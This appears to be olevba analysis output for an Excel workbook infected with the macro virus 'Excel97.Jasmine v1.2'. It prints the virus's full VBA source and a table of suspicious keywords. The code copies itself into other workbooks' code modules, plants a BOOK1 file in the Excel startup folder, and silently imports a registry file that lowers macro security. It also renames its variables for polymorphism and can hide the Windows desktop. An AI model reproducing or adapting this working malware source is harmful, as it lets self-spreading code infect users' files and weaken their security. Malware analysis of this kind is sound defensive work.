olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Jasmine-3c3ce18753d6236185d25a58089e25f39d7ac54c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Jasmine-3c3ce18753d6236185d25a58089e25f39d7ac54c - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Excel97.Jasmine v1.2
'Copyright (c) 1999, cry0tek

Public Pl6, Ff8Cv6 As Boolean
'Jasmine
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
Dim Gr3Dd0Mi4Aa1 As Object
Ie6Xh0Xq9Jy2Xo6Le3 = "c:\remove.reg": Dc3Iu8Cp2Cm1 = "[HKEY_CURRENT_USER\Software\Microsoft\Office\"
For i = 1 To Workbooks.Count
 Set Gr3Dd0Mi4Aa1 = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 Randomize
 If Gr3Dd0Mi4Aa1.Lines(5, 1) = "'Jasmine" Then
  Call Encode(Gr3Dd0Mi4Aa1)
  Tu4Wv5 = Gr3Dd0Mi4Aa1.Lines(1, _
   Gr3Dd0Mi4Aa1.CountOfLines)
  GoTo Ea1It5Ms4Gx7Vu8Ug2Ot7
 End If
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  Set Qr8 = Workbooks(i).VBProject.VBComponents.Item(j)
  Vm1 = Qr8.Name
  Set Gr3Dd0Mi4Aa1 = Qr8.CodeModule
  If InStr(1, Vm1, "Sheet") Then
   If Gr3Dd0Mi4Aa1.Lines(5, 1) = "'Jasmine" Then _
    Call Encode(Gr3Dd0Mi4Aa1)
    Tu4Wv5 = Workbooks(i).VBProject.VBComponents _
    .Item(j).CodeModule.Lines(1, Gr3Dd0Mi4Aa1.CountOfLines)
    GoTo Ea1It5Ms4Gx7Vu8Ug2Ot7
  End If
 Next
Next
Ea1It5Ms4Gx7Vu8Ug2Ot7:
If UCase(Dir(Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
 If Pl6 <> True Then
  Pl6 = True: Ff8Cv6 = True
  Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\BOOK1.", FileFormat:=xlNormal, AddToMru:=False
 End If
End If
For i = 1 To Workbooks.Count
 Set Gr3Dd0Mi4Aa1 = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 If Gr3Dd0Mi4Aa1.Lines(5, 1) <> "'Jasmine" Then
  Gr3Dd0Mi4Aa1.InsertLines 1, Tu4Wv5
  Gr3Dd0Mi4Aa1.ReplaceLine 6, "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
 End If
  For ii = 1 To Workbooks(i).VBProject.VBComponents.Count
   Set Qr8 = Workbooks(i).VBProject.VBComponents.Item(ii)
   Vm1 = Qr8.Name
   Set Infline = Qr8.CodeModule
   If Infline.Lines(5, 1) <> "'Jasmine" Then
    If InStr(1, Vm1, "Sheet") Then
     Qr8.CodeModule.InsertLines 1, Tu4Wv5
     Qr8.CodeModule.ReplaceLine 6, "Private Sub WorkBook_Activate()"
    End If
   End If
  Next
Next
If Ff8Cv6 = True Then
 Ff8Cv6 = False
 Workbooks("Book1.").Close savechanges:=True
 Open Ie6Xh0Xq9Jy2Xo6Le3 For Output As 1
 Print #1, "REGEDIT4"
 If Left(Application.Version, 1) = 9 Then
  Print #1, Dc3Iu8Cp2Cm1 & "9.0\Excel\Security]"
  Print #1, """Level""=dword:00000001"
 Else
  Print #1, Dc3Iu8Cp2Cm1 & "8.0\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
  Print #1, Dc3Iu8Cp2Cm1 & "8.0\New User\Settings\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
  Print #1, Dc3Iu8Cp2Cm1 & "8.0\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
 End If
 Close 1
 Shell "regedit /s " & Ie6Xh0Xq9Jy2Xo6Le3, vbHide
 Kill Ie6Xh0Xq9Jy2Xo6Le3
End If
If Minute(Now) = Second(Now) Then
 Select Case Day(Now)
  Case 1 To 5 And Int((5 * Rnd) + 1) = 1
   Application.StatusBar = "Excel97.Jasmine v1.2"
  Case 6 To 10 And Int((5 * Rnd) + 1) = 1
   With Assistant.NewBalloon
    .Heading = "Excel97.Jasmine v1.2"
    .Text = "Since the only time I see her near" & vbCr & "Is when I close my eyes" & vbCr & _
            "Should I keep it that way" & vbCr & "The only way I can make her stay..." & vbCr & vbCr
    .Animation = 22
    .Show
   End With
  Case 11 To 20 And Int((5 * Rnd) + 1) = 1
   For i = 1 To 600 Step Int((Rnd * 2) + 1)
    Oa6Oz6Uf9Xc9 = Chr(65 + Int(Rnd * 26))
    j = Oa6Oz6Uf9Xc9 & (Int(Rnd * 20) + 1)
    Range(j).Select
    ActiveCell.FormulaR1C1 = "Excel97.Jasmine"
    Range(j).Select
    With Selection.Font
     .Name = "Arial"
     .Size = 10
    End With
    Range(j).Select
    With Selection.Interior
     .ColorIndex = Int((Rnd * 56) + 1)
     .Pattern = xlSolid
    End With
    Columns(Oa6Oz6Uf9Xc9 & ":" _
     & Oa6Oz6Uf9Xc9).EntireColumn.AutoFit
    Selection.Font.ColorIndex = Int((Rnd * 56) + 1)
   Next
  Case 21 To 30 And Int((5 * Rnd) + 1) = 1
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDesktop") = 1&
  Case 31 And Int((5 * Rnd) + 1) = 1
   MsgBox "", vbInformation, "Excel97.Jasmine v1.2"
 End Select
End If
End Sub
Private Sub Encode(Loc As Object)
On Error Resume Next
Dim varray(1 To 14) As String
Dim Cw1Od6Tf2Ai8Mt9 As Long: Dim Zj3Nf2Qh4Kn3Pj3 As Long: Dim Hl8Bw4Ko3Oi9Hv7We5Sb4 As Long: Dim Je3Eb5Uu4Zi5Eu6 As Long
varray(1) = "Ie6Xh0Xq9Jy2Xo6Le3": varray(2) = "Gr3Dd0Mi4Aa1": varray(3) = "Tu4Wv5": varray(4) = "Qr8": varray(5) = "Vm1": varray(6) = "Dc3Iu8Cp2Cm1": varray(7) = "Pl6"
varray(8) = "Ff8Cv6": varray(9) = "Oa6Oz6Uf9Xc9": varray(10) = "Cw1Od6Tf2Ai8Mt9": varray(11) = "Zj3Nf2Qh4Kn3Pj3": varray(12) = "Hl8Bw4Ko3Oi9Hv7We5Sb4": varray(13) = "Je3Eb5Uu4Zi5Eu6": varray(14) = "Ea1It5Ms4Gx7Vu8Ug2Ot7"
Randomize
For i = 1 To 14
 For j = 1 To Int((10 * Rnd) + 1)
  PolyVal = PolyVal + Chr(65 + Int(Rnd * 26)) & Chr(122 - Int(Rnd * 26)) & Chr(48 + Int(Rnd * 10))
 Next
 With Loc
  Cw1Od6Tf2Ai8Mt9 = 1: Zj3Nf2Qh4Kn3Pj3 = 1: Hl8Bw4Ko3Oi9Hv7We5Sb4 = .CountOfLines: Je3Eb5Uu4Zi5Eu6 = Len(.Lines(.CountOfLines, 1))
  Do While .Find(varray(i), Cw1Od6Tf2Ai8Mt9, Zj3Nf2Qh4Kn3Pj3, Hl8Bw4Ko3Oi9Hv7We5Sb4, Je3Eb5Uu4Zi5Eu6, True)
   strVal = .Lines(Cw1Od6Tf2Ai8Mt9, 1)
   strVal = Left(strVal, Zj3Nf2Qh4Kn3Pj3 - 1) & PolyVal & Mid(strVal, Je3Eb5Uu4Zi5Eu6)
   .ReplaceLine Cw1Od6Tf2Ai8Mt9, strVal
   Cw1Od6Tf2Ai8Mt9 = Hl8Bw4Ko3Oi9Hv7We5Sb4 + 1: Zj3Nf2Qh4Kn3Pj3 = 1
   Hl8Bw4Ko3Oi9Hv7We5Sb4 = .CountOfLines: Je3Eb5Uu4Zi5Eu6 = Len(.Lines(.CountOfLines, 1))
  Loop
 End With
 PolyVal = ""
Next
End Sub


-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Jasmine-3c3ce18753d6236185d25a58089e25f39d7ac54c - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Jasmine-3c3ce18753d6236185d25a58089e25f39d7ac54c - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Jasmine-3c3ce18753d6236185d25a58089e25f39d7ac54c - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |WorkBook_Activate   |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |remove.reg          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

